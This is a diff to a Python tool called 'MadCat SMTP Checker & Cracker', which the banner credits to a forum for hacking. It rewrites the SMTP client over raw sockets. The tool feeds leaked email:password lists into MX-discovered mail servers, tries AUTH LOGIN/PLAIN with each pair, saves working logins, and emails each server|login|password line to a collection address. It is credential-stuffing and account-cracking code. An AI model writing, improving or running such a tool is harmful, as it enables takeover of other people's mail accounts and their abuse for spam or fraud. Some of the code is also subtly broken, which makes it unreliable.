@@ -1,6 +1,6 @@
 #!/usr/local/bin/python3
 
-import socket, threading, sys, ssl, smtplib, time, re, os, random, signal, queue, resource
+import socket, threading, sys, ssl, smtplib, time, re, os, random, signal, queue, resource, base64
 try:
 	import psutil, requests
 	from dns import resolver
@@ -45,7 +45,7 @@ def show_banner():
          |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
          ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
          ╙█                           ╙                                         
-          ╙     {b}MadCat SMTP Checker & Cracker v22.10.10{z}
+          ╙     {b}MadCat SMTP Checker & Cracker v22.10.12{z}
                 Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
                 https://github.com/aels/mailtools
                 https://t.me/freebug
@@ -93,6 +93,10 @@ def tune_network():
 	except Exception as e:
 		print(wrn+'failed to set rlimit_nofile:   '+str(e))
 
+def debug(msg):
+	global debuglevel, results_que
+	debuglevel and results_que.put(msg)
+
 def load_smtp_configs():
 	global autoconfig_data_url, domain_configs_cache
 	try:
@@ -112,15 +116,20 @@ def first(a):
 def bytes_to_mbit(b):
 	return round(b/1024./1024.*8, 2)
 
+def base64_encode(string):
+	return base64.b64encode(str(string).encode('ascii')).decode('ascii')
+
 def normalize_delimiters(s):
 	return re.sub(r'[;,\t| \']+', ':', re.sub(r'"+', '', s))
 
 def is_listening(ip, port):
 	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.settimeout(0)
-		s = ssl.wrap_socket(s) if int(port) == 465 else s
-		s.connect((ip, int(port)))
+		port = int(port)
+		socket_type = socket.AF_INET6 if ':' in ip else socket.AF_INET
+		s = socket.socket(socket_type, socket.SOCK_STREAM)
+		s.settimeout(3)
+		s = ssl.wrap_socket(s, server_hostname=ip, do_handshake_on_connect=False) if port == 465 else s
+		s.connect((ip, port))
 		s.close()
 		return True
 	except:
@@ -135,7 +144,9 @@ def get_rand_ip_of_host(host):
 			ip_array = resolver_obj.resolve(host, 'a')
 		except:
 			raise Exception('No A record found for '+host)
-	return str(random.choice(ip_array))
+	ip = str(random.choice(ip_array))
+	debug('get ip: '+ip)
+	return ip
 
 def get_alive_neighbor(ip, port):
 	if ':' in str(ip):
@@ -158,8 +169,8 @@ def guess_smtp_server(domain):
 		domains_arr += [mx_domain]
 	except:
 		raise Exception('no MX records found for: '+domain)
-	if re.search(dangerous_domains, mx_domain) and not re.search(r'\.outlook\.com$', mx_domain):
-		raise Exception('\033[31mskipping dangerous domain: '+mx_domain+' (for '+domain+')\033[0m')
+	if is_ignored_host(mx_domain) or re.search(dangerous_domains, mx_domain) and not re.search(r'\.outlook\.com$', mx_domain):
+		raise Exception(white('skipping domain: '+mx_domain+' (for '+domain+')',2))
 	if re.search(r'protection\.outlook\.com$', mx_domain):
 		return domain_configs_cache['outlook.com']
 	for host in domains_arr:
@@ -168,6 +179,7 @@ def guess_smtp_server(domain):
 		except:
 			continue
 		for port in [587, 465, 25]:
+			debug(f'trying {host}, {ip}:{port}')
 			if is_listening(ip, port):
 					return ([host+':'+str(port)], default_login_template)
 	raise Exception('no connection details found for '+domain)
@@ -179,18 +191,6 @@ def get_smtp_config(domain):
 		domain_configs_cache[domain] = ['', default_login_template]
 		domain_configs_cache[domain] = guess_smtp_server(domain)
 	return domain_configs_cache[domain]
-
-def get_free_smtp_server(smtp_server, port):
-	smtp_class = smtplib.SMTP_SSL if str(port) == '465' else smtplib.SMTP
-	smtp_server_ip = get_rand_ip_of_host(smtp_server)
-	try:
-		return smtp_class(smtp_server_ip, port, local_hostname=smtp_server, timeout=5)
-	except Exception as e:
-		if re.search(r'too many connections|threshold limitation|parallel connections|try later|refuse', str(e).lower()):
-			smtp_server_ip = get_alive_neighbor(smtp_server_ip, port)
-			return smtp_class(smtp_server_ip, port, local_hostname=smtp_server, timeout=5)
-		else:
-			raise Exception(e)
 
 def quit(signum, frame):
 	print('\r\n'+okk+'Exiting... See ya later. Bye.')
@@ -220,22 +220,89 @@ def wc_count(filename):
 
 def is_ignored_host(mail):
 	global exclude_mail_hosts
-	return len([ignored_str for ignored_str in exclude_mail_hosts.split(',') if ignored_str in mail.split('@')[1]])>0
+	return len([ignored_str for ignored_str in exclude_mail_hosts.split(',') if ignored_str in mail.split('@')[-1]])>0
+
+def socket_send_and_read(sock, cmd=False):
+	if cmd:
+		debug('>>> '+cmd)
+		sock.send((cmd.strip()+'\r\n').encode('ascii'))
+	scream = sock.recv(2**10).decode('ascii').strip()
+	debug('<<< '+scream)
+	return scream
+
+def socket_get_free_smtp_server(smtp_server, port):
+	port = int(port)
+	smtp_server_ip = get_rand_ip_of_host(smtp_server)
+	socket_type = socket.AF_INET6 if ':' in smtp_server_ip else socket.AF_INET
+	s = socket.socket(socket_type, socket.SOCK_STREAM)
+	s = ssl.wrap_socket(s) if port == 465 else s
+	s.settimeout(5)
+	try:
+		s.connect((smtp_server_ip, port))
+	except Exception as e:
+		if re.search(r'too many connections|threshold limitation|parallel connections|try later|refuse', str(e).lower()):
+			smtp_server_ip = get_alive_neighbor(smtp_server_ip, port)
+			s.connect((smtp_server_ip, port))
+		else:
+			raise Exception(e)
+	return s
+
+def socket_try_tls(sock, self_host):
+	answer = socket_send_and_read(sock, 'EHLO '+self_host)
+	if re.findall(r'starttls', answer.lower()):
+		answer = socket_send_and_read(sock, 'STARTTLS')
+		if answer[:3] == '220':
+			sock = ssl._create_unverified_context().wrap_socket(sock)
+	return sock
+
+def socket_try_login(sock, self_host, smtp_login, smtp_password):
+	smtp_login_b64 = base64_encode(smtp_login)
+	smtp_pass_b64 = base64_encode(smtp_password)
+	smtp_login_pass_b64 = base64_encode(smtp_login+':'+smtp_password)
+	answer = socket_send_and_read(sock, 'EHLO '+self_host)
+	if re.findall(r'auth[\w =-]+(plain|login)', answer.lower()):
+		if re.findall(r'auth[\w =-]+login', answer.lower()):
+			answer = socket_send_and_read(sock, 'AUTH LOGIN '+smtp_login_b64)
+			if answer[:3] == '334':
+				try:
+					answer = socket_send_and_read(sock, smtp_pass_b64)
+				except:
+					raise Exception('wrong password, connection closed')
+		elif re.findall(r'auth[\w =-]+plain', answer.lower()):
+			answer = socket_send_and_read(sock, 'AUTH PLAIN '+smtp_login_pass_b64)
+		if answer[:3] == '235' and 'succ' in answer.lower():
+			return sock
+	raise Exception(answer)
+
+def socket_try_mail(sock, smtp_from, smtp_to, data):
+	answer = socket_send_and_read(sock, f'MAIL FROM: <{smtp_from}>')
+	if answer[:3] == '250':
+		answer = socket_send_and_read(sock, f'RCPT TO: <{smtp_to}>')
+		if answer[:3] == '250':
+			answer = socket_send_and_read(sock, 'DATA')
+			if answer[:3] == '354':
+				answer = socket_send_and_read(sock, data)
+				if answer[:3] == '250':
+					socket_send_and_read(sock, 'QUIT')
+					s.close()
+					return True
+	s.close()
+	raise Exception(answer)
 
 def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password):
-	global verify_email, debuglevel
+	global verify_email
 	if is_valid_email(smtp_user):
 		smtp_login = login_template.replace('%EMAILADDRESS%', smtp_user).replace('%EMAILLOCALPART%', smtp_user.split('@')[0]).replace('%EMAILDOMAIN%', smtp_user.split('@')[1])
 	else:
 		smtp_login = smtp_user
-	server_obj = get_free_smtp_server(smtp_server, port)
-	server_obj.set_debuglevel(debuglevel)
-	server_obj.ehlo()
-	if server_obj.has_extn('starttls') and port != '465':
-		server_obj.starttls()
-		server_obj.ehlo()
-	server_obj.login(smtp_login, password)
-	if verify_email:
+	s = socket_get_free_smtp_server(smtp_server, port)
+	answer = socket_send_and_read(s)
+	if answer[:3] == '220':
+		s = socket_try_tls(s, smtp_server)
+		s = socket_try_login(s, smtp_server, smtp_login, password)
+		if not verify_email:
+			s.close()
+			return True
 		headers_arr = [
 			'From: MadCat checker <%s>'%smtp_user,
 			'Resent-From: admin@localhost',
@@ -252,9 +319,10 @@ def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password
 			'Content-Transfer-Encoding: 8bit'
 		]
 		body = f'{smtp_server}|{port}|{smtp_login}|{password}'
-		message_as_str = '\n'.join(headers_arr+['', body, ''])
-		server_obj.sendmail(smtp_user, verify_email, message_as_str)
-	server_obj.quit()
+		message_as_str = '\r\n'.join(headers_arr+['', body, '.', ''])
+		return socket_try_mail(s, smtp_user, verify_email, message_as_str)
+	s.close()
+	raise Exception(answer)
 
 def worker_item(jobs_que, results_que):
 	global min_threads, threads_counter, verify_email, goods, no_jobs_left, loop_times, default_login_template
@@ -286,7 +354,7 @@ def worker_item(jobs_que, results_que):
 				open(smtp_filename, 'a').write(f'{smtp_server}|{port}|{smtp_user}|{password}\n')
 				goods += 1
 			except Exception as e:
-				results_que.put(orange((smtp_server and port and smtp_server+':'+port+' - ' or '')+str(e).strip()[0:130],0))
+				results_que.put(orange((smtp_server and port and smtp_server+':'+port+' - ' or '')+', '.join(str(e).splitlines()).strip()[0:130],0))
 			time.sleep(0.04) # unlock other threads a bit
 			loop_times.append(time.perf_counter() - time_start)
 			loop_times.pop(0) if len(loop_times)>min_threads else 0
@@ -388,9 +456,10 @@ total_lines = wc_count(list_filename)
 resolver_obj = resolver.Resolver()
 resolver_obj.nameservers = custom_dns_nameservers
 domain_configs_cache = {}
-load_smtp_configs()
 
-print(okk+'loading SMTP configs:          '+bold(num(len(domain_configs_cache))+' lines'))
+print(inf+'loading SMTP configs...'+up)
+load_smtp_configs()
+print(wl+okk+'loading SMTP configs:          '+bold(num(len(domain_configs_cache))+' lines'))
 print(inf+'source file:                   '+bold(list_filename))
 print(inf+'total lines to procceed:       '+bold(num(total_lines)))
 print(inf+'email & password colls:        '+bold(email_collumn)+' and '+bold(password_collumn))
